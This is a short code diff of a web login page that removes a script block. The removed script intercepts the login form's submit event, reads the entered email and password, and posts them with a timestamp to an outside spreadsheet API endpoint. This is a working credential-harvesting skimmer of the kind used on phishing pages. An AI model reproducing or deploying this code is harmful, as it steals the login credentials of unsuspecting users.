@@ -191,27 +191,6 @@
   </main>
 </div>
 
-    <script>
-  document.getElementById("loginForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-    const fecha = new Date().toISOString();
-
-    fetch("https://api.sheetbest.com/sheets/c7472fd5-4c77-4694-8ef0-c84a9c69f8fd", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        email: email,
-        password: password,
-        fecha: fecha
-      })
-    });
-
-    
 <script>
   function validateLogin() {
     const password = document.getElementById("password").value;
